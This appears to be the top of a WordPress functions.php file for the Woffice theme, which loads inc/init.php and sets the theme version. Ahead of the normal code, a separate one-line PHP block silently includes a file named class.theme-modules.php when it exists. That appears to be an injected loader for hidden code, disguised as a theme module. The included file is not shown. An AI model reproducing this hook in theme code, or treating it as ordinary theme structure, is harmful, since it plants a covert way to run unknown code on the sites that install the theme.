<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Theme Includes
 */
require_once get_template_directory() .'/inc/init.php';

define('WOFFICE_THEME_VERSION', '4.0.6');
